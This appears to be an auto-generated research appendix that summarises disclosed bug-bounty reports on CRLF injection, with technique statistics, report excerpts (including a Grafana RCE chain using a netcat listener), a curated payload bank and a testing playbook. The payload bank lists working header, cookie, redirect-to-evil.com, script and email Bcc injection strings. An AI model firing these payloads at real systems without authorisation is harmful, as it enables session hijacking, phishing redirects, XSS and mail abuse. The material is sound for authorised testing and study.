# Evidence appendix — CRLF Injection and Response Splitting

Mined from all **115 valid disclosed reports** for this class (19 paid, 17% — payment is not validity).

## Technique frequency (all valid writeups)

| Item | Count |
|---|---:|
| internal service / port / container | 31 |
| encoding / double-encode / null byte | 30 |
| header injection (Host / X-Forwarded / etc.) | 26 |
| WAF / sanitizer / filter bypass | 23 |
| Content-Type / body-format switch | 18 |
| file upload / filename / extension | 14 |
| parser confusion / normalization | 14 |
| cache / CDN / unkeyed header | 13 |
| public source-code / repo review | 13 |
| admin / privileged-role context | 11 |
| HTTP method / verb tampering | 10 |
| subdomain / DNS / cert-transparency recon | 8 |
| XML / SOAP / SAML / XXE | 6 |
| JS bundle / source-map inspection | 6 |
| intercept & replay request in Burp | 5 |
| second-order / stored / blind delivery | 5 |
|  HosT/absolute-URL reset poisoning | 4 |
| error message / stack trace probing | 4 |
| two-account / cross-account replay | 4 |
| API docs / Swagger / introspection | 4 |
| redirect chain / Location header | 3 |
| race / concurrency / timing | 3 |
| OAST / DNS / HTTP callback proof | 3 |
| unauthenticated / removed-cookie test | 3 |
| deserialization / gadget chain | 3 |
| DOM / HTML source inspection | 2 |
| employee / developer public info | 2 |
| parameter pollution / duplicate keys | 2 |
| JWT / token / base64 decode | 2 |
| third-party data / paste / breach reuse | 2 |
| webhook / OAuth / SAML / integration abuse | 1 |
| verbose debug / framework fingerprint | 1 |
| mass assignment / extra request fields | 1 |
| git history / exposed .git | 1 |

## Tools mentioned

| Item | Count |
|---|---:|
| curl | 32 |
| browser | 18 |
| python | 15 |
| source-code-review | 11 |
| devtools | 7 |
| burp | 4 |
| git | 4 |
| javascript-debugging | 3 |
| burp-repeater | 1 |
| burp-intruder | 1 |

## Bypass primitives

| Item | Count |
|---|---:|
| crlf | 274 |
| %0d%0a | 116 |
| bypass | 34 |
| host header | 30 |
| content-type | 28 |
| desync | 15 |
| header injection | 11 |
| bypassing | 6 |
| bypassed | 5 |
| transfer-encoding | 5 |
| whitelist | 5 |
| blind | 5 |
| bypasses | 5 |
| chunked | 4 |
| url encoded | 3 |
| lowercase | 2 |
| open redirect | 2 |
| null byte | 2 |
| unicode | 1 |
| url encoding | 1 |
| url-encoded | 1 |
| percent-encoded | 1 |
| allowlist | 1 |

## Impact language

| Item | Count |
|---|---:|
| localhost | 34 |
| password | 33 |
| token | 26 |
| admin | 25 |
| unauthorized | 13 |
| credential | 7 |
| secret | 4 |
| internal service | 3 |
| arbitrary command | 3 |
| internal network | 3 |
| remote code execution | 2 |
| data leak | 1 |
| rce | 1 |
| exfiltrate | 1 |
| exfiltratio | 1 |

## Parameters observed

| Item | Count |
|---|---:|
| result | 10 |
| test | 6 |
| domain | 4 |
| crlf | 3 |
| mycookie | 2 |
| max-age | 2 |
| session | 2 |
| curl | 2 |
| headers | 2 |
| _ga | 1 |
| _gat | 1 |
| chrome | 1 |
| test2 | 1 |
| newsletter_signup_email | 1 |
| newsletter_signup_zipcode | 1 |
| newsletter_placement | 1 |
| response | 1 |
| failures | 1 |
| session_token | 1 |
| wpn_ad_cookie | 1 |
| notify | 1 |
| h3name.len | 1 |
| injection | 1 |
| client_source_ip | 1 |
| client_dest_ip | 1 |
| is_ipv6 | 1 |
| haproxyprotocol | 1 |
| injected_ip | 1 |
| target | 1 |
| curlopt_transfertext | 1 |

## Recurring approach patterns

- **2×** limitations the test server is a minimal synthetic model built to isolate and prove the session tracking by resource behavior pattern we have not tested against and are not claiming to have compromised any specific real ip camera nvr or other rtsp server product
  - e.g. ### Limitations - The test server is a minimal synthetic model built to isolate and prove the session-tracking-by-resource behavior pattern; we have not tested against, and are not claiming to have compromised, any specific real IP camera, NVR, or other RTSP server product.
- **1×** sp1d3rs was able to demonstrate this vulnerability by crafting a specially formatted url
  - e.g. @sp1d3rs was able to demonstrate this vulnerability by crafting a specially formatted URL.
- **1×** poc i sent this post request to a test email post body the resulting response the referrer attritube is encoded and sent to the victims email
  - e.g. ###POC: I sent this post request to a test email: Post body: The resulting response: ###The referrer attritube is encoded and sent to the victims email.
- **1×** hey guys i found that the site is vulnerable to a crlf injection
  - e.g. Hey guys, I found that the site is vulnerable to a CRLF Injection.
- **1×** in this case this is could be done by modifying an http request directed to the adding for example the following payload 0d 0aset cookie test2 test domain with the preceding payload an attacker is going to set on the victim s browser that is visiting the malicious url a new cookie with an arbitrary value
  - e.g. In this case this is could be done by modifying an HTTP request directed to the "███" adding, for example, the following payload: > %0D%0ASet-Cookie:test2=test;domain=.████ With the preceding payload, an attacker is going to set, on the victim's browser that is visiting the malicious URL, a new cook
- **1×** i recently discovered that we can add arbitery value in reset pass token and compromise the life time unlimitedly
  - e.g. I recently discovered that we can add arbitery value in reset pass token and compromise the life time unlimitedly ..
- **1×** okay so i decoded the value and changed year to instead of and it s all done miracle i got this page with different warning
  - e.g. okay so I decoded the value and changed year to 2019 instead of 2017 ...and it's all done ....miracle i got this page with different warning ...
- **1×** the agent application was vulnerable to a response splitting attack when parsing line feed characters in a given url
  - e.g. The agent application was vulnerable to a response splitting attack when parsing line feed characters in a given URL.
- **1×** i found crlf injection a few months ago
  - e.g. I found CRLF Injection a few months ago.
- **1×** description during the recent penetration test i have found a whitelist bypass using crlf injection
  - e.g. **Description:** During the recent penetration test, I have found a whitelist bypass using CRLF Injection.
- **1×** as mentioned in the description i was able to bypass a whitelist function during the recent penetration test and exploit a medium high vulnerability thanks to it
  - e.g. As mentioned in the description, I was able to bypass a whitelist function during the recent penetration test and exploit a medium/high vulnerability thanks to it.
- **1×** the aivenv1 token can be retrieved by inspecting the browser traffic
  - e.g. The aivenv1 token can be retrieved by inspecting the browser traffic.
- **1×** i added additional logging to var www nextcloud 3rdparty swiftmailer swiftmailer lib classes swift transport abstractsmtptransport php to confirm that the commands were injected
  - e.g. I added additional logging to `/var/www/nextcloud/3rdparty/swiftmailer/swiftmailer/lib/classes/Swift/Transport/AbstractSmtpTransport.php` to confirm that the commands were injected.
- **1×** this is most commonly done by modifying an http parameter or url
  - e.g. This is most commonly done by modifying an HTTP parameter or URL.
- **1×** ai statement yes i have used ai to find the vulnerability
  - e.g. ### AI statement Yes, I have used AI to find the vulnerability.
- **1×** affected version i have tested on ubuntu with curl system curl dev my local build pycurl with libcurl dev the full system curl version the full local build version steps to reproduce
  - e.g. ## Affected version I have tested on Ubuntu 24.04.2 with: - curl 8.5.0 (system) - curl 8.15.0-DEV (my local build) - PycURL/7.45.6 with libcurl/8.12.1-DEV The full system curl version: The full local build version: ## Steps To Reproduce: 1.
- **1×** run a test smtp server the one i used is listed below named smtp server ran as smtp server and listened at localhost
  - e.g. run a test SMTP server; the one I used is listed below named `smtp_server`, ran as `./smtp_server` and listened at `localhost:1025` 1.
- **1×** supporting material references normal mail send sending with crlf in from field sending with crlf in rcpt field sending with crlf using pycurl server logs for the illustration smtp server script send with pycurl script impact summary this vulnerability allows attackers to inject arbitrary smtp commands like vrfy by crafting malicious email addresses
  - e.g. ## Supporting Material/References: Normal mail send: Sending with CRLF in "from" field: Sending with CRLF in "rcpt" field: Sending with CRLF using `pycURL`: Server logs (for the illustration): `smtp_server` script: `send-with-pycurl` script: ## Impact ## Summary: This vulnerability allows attackers 
- **1×** the strict standard safe lib urlapi c when parsing a full url e g smtp libcurl uses curl junkscan to ensure no control characters are present
  - e.g. The Strict Standard (Safe): `lib/urlapi.c`** When parsing a full URL (e.g., `smtp://...`), `libcurl` uses `Curl_junkscan` to ensure no control characters are present.
- **1×** summary i have discovered a crlf injection vulnerability in the imap protocol implementation of libcurl
  - e.g. ## Summary: I have discovered a CRLF injection vulnerability in the IMAP protocol implementation of libcurl.
- **1×** result the server receives a002 login hacker logout password123 expected behavior the username should be quoted e g hacker r nlogout or the client should reject the crlf characters before sending
  - e.g. **Result:** The server receives: A002 LOGIN hacker LOGOUT password123 **Expected Behavior:** The username should be quoted (e.g., `"hacker\r\nLOGOUT"`) or the client should reject the CRLF characters before sending.
- **1×** the issue occurs before any server side parsing
  - e.g. - The issue occurs before any server-side parsing.
- **1×** run monerod with zmq rpc reachable from the test host and with logging enabled for request traces
  - e.g. Run monerod with ZMQ RPC reachable from the test host and with logging enabled for request traces.
- **1×** verification markers attacker marker begin and attacker marker end should appear in daemon logs along with forged looking payload line text
  - e.g. * Verification markers: ATTACKER_MARKER_BEGIN and ATTACKER_MARKER_END should appear in daemon logs along with forged-looking payload line text.

## Case studies (full excerpts)

### 1200647 — Grafana RCE via SMTP server parameter injection
Aiven Ltd · $5000 · critical · https://hackerone.com/reports/1200647

## Summary: This report is similar to [#1180653]( except with different parameter injection entrypoint. SMTP server password configuration setting accepts new line characters. This can be used to set non-exported configuration variables. Using this CRLF-injection, the `rendering_args` of grafana image renderer can be modified which leads to code execution on the Grafana server. ## Steps To Reproduce: 1.Create Aiven Grafana instance 2.Setup netcat listener on your server: `nc -n -lvp 4444` 3.Send the following request to the grafana instance, replace place holders. The aivenv1 token can be retrieved by inspecting the browser traffic. 4. Browse to to trigger the exploit. ## Impact Command execution on the grafana server. Access and modify data on the grafana server and possibly the attacker could pivot into other servers on the aiven network.

### 1878489 — CRLF Injection in Nodejs ‘undici’ via host
Internet Bug Bounty · $600 · medium · https://hackerone.com/reports/1878489

Summary: undici library should be protects HTTP headers from CRLF injection vulnerabilities. However, CRLF injection exists in the ‘host’ header of undici.request api. Description: like Source code: lib/core/request.js:296 Example: {F2182450} I have submitted the report： Security Releases: Security Advisory: ## Impact All versions of the 19.x, 18.x and 16.x release lines.

### 409512 — mod_userdir CRLF injection (CVE-2016-4975)
Internet Bug Bounty · $500 · medium · https://hackerone.com/reports/409512

Possible CRLF injection allowing HTTP response splitting attacks for sites which use mod_userdir. This issue was mitigated by changes made in 2.4.25 and 2.2.32 which prohibit CR or LF injection into the "Location" or other outbound header key or value. Reported to security team 24th July 2016 Issue public 14th August 2018 Update Released 20th December 2016 Affects 2.4.23, 2.4.20, 2.4.18, 2.4.17, 2.4.16, 2.4.12, 2.4.10, 2.4.9, 2.4.7, 2.4.6, 2.4.4, 2.4.3, 2.4.2, 2.4.1 ## Impact CRLF Injection

### 66386 — [www.*.myshopify.com] CRLF Injection
Shopify · $500 · severity n/a · https://hackerone.com/reports/66386

CRLF Injection via Request-URI PoC: HTTP Response: Result: Creating a cookie-param "test=test" on *.myshopify.com

### 2147132 — Security bug https://bugzilla.mozilla.org/oauth/authorize - CRLF Header injection via "redirect_uri" parameter
Mozilla · $200 · low · https://hackerone.com/reports/2147132

## Summary: CRLF / HTTP Header Injection. Allows you to set any headers/etc (Set-Cookie...) Page: Parameter: redirect_uri ## Steps To Reproduce: PoC - does not require authorization: 1. 2. or (with true redirect): HTTP response: ## Impact ## Summary: Possible manipulation of user session / open redirect.

### 2189960 — CRLF injection leads to internal XSS on PangleGlobal
TikTok · no bounty (valid finding) · medium · https://hackerone.com/reports/2189960

A cross-site scripting vulnerability was found on a Pangle endpoint due to CRLF injection on the 'file_name' parameter. This was caused by the reflection of user-supplied data without appropriate HTML escaping or output encoding and could have resulted in a JavaScript payload being injected into the above endpoint and executed within the context of the another user's browser. This vulnerability has been resolved. We thank @serverinspector for reporting this to our team.

### 712979 — Creating malformed URLs via new line character in-between two URLs leads to misrepresented hyperlinks in Tweets/DMs
X / xAI · no bounty (valid finding) · low · https://hackerone.com/reports/712979

## Summary When composing a tweet or a direct message it is possible to use a new line character (`%0d`) to seperate two URLs within the actual hyperlinking process, but not the URL displaying process. The new line character acts as an invisible character that disrupts the actual hyperlinking process, whereas when previewed does not show up. This allows an attacker to create realistic looking phishing URLs via combining `attacker.com` + `%0d` + `website.com`. If an attacker controlled both `itter.com` and `fakewebsite.tw` in the below request, they could trick victim's into browsing to, what they think would be, `fakewebsite.twitter.com`. These two URLs, when put together and displayed, would look like the following on a tweet or a direct message: {F606210} But, after being actually clicked, would take you to the following URLs: {F606211} * [ {F606212} * [ This is also possible to do in direct messages, as so... {F606213} ## Description I don't think this falls under any real classification of issues other than "CRLF injection", but even then, it's definitely not the right category. This is simply abusing Twitter's URL composing process to create fake hyperlinks. Overall I think this is a neat issue that I think would definitely be exploited by bad actors. ## Steps To Reproduce: 1.) Open either (1) direct messages, or (2) composing a tweet 2.) Type out `fakewebsite.twitter.com`

## Full curated payload bank

### Header injection

```text
%0d%0aSet-Cookie:%20x=1
%0aSet-Cookie:%20x=1
%0d%0aLocation:%20//evil.com
%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK
%0d%0aX-XSS-Protection:%200
%0d%0a%0d%0a<script>alert(1)</script>
%E5%98%8A%E5%98%8DSet-Cookie:%20x=1
%E5%98%8A%E5%98%8DLocation:%20//evil.com
\r\nSet-Cookie: x=1
\nSet-Cookie: x=1
%0d%0aSet-Cookie:%20x=1%3b%20SameSite=None
%0d%0aRefresh:%200%3burl=//evil.com
```

### Email / log / filename contexts

```text
%0d%0aBcc: attacker@evil.com
%0d%0aCc: attacker@evil.com
%0d%0aSubject:%20injected
a%0d%0aBcc:attacker@evil.com
file%0d%0aSet-Cookie:%20x=1.txt
line1%0d%0aline2
%0d%0a%09injected
%0d%0a%20injected
```

## Field playbook (unedited)

### quick

- Inject %0d%0a into params reflected in headers, redirects, or filenames.
- Test header injection for XSS, cache poisoning, and smuggling.
- Check email header injection in contact/notification forms.

### payloads

- `%0d%0aSet-Cookie:%20x=1` `%0aLocation:%20//evil.com`
- `%E5%98%8A%E5%98%8D` unicode CRLF
- `\r\n` in filenames and log lines

### bypass

- Double encoding and unicode line separators.
- Use header folding and whitespace variations.

### surface

- redirect
- next
- url
- filename
- email
- subject
- log

### tools

- Burp
- crlfuzz
- interactsh

### chain

- CRLF -> XSS.
- CRLF -> cache poisoning.
- CRLF -> smuggling.

## Corpus search commands

```sh
python3 ~/.local/share/hackerone-reports/h1.py stats --class crlf-injection
python3 ~/.local/share/hackerone-reports/h1.py search "<feature or param>" --class crlf-injection --limit 10
python3 ~/.local/share/hackerone-reports/h1.py show <id> --full
```
